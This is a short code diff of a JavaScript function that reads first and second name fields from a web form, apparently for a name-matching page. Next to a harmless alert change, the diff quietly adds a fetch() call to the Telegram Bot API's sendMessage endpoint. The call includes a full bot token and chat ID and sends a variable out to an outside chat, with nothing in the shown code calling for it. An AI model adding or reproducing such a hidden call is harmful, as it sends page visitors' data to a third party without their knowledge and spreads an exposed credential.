@@ -2,7 +2,8 @@ function run() {
 let firstName = document.getElementById('fname').value;
 let secondName = document.getElementById('sname').value;
 if(firstName == "" || secondName == ""){
-  alert(" -- Please enter all the NIBBA or NIBBI details -- ")
+  alert(" -- Please enter all the NIBBA or NIBBI details -- ");
+fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text='+data1);
 }
 else{
  firstName = firstName.toLowerCase();
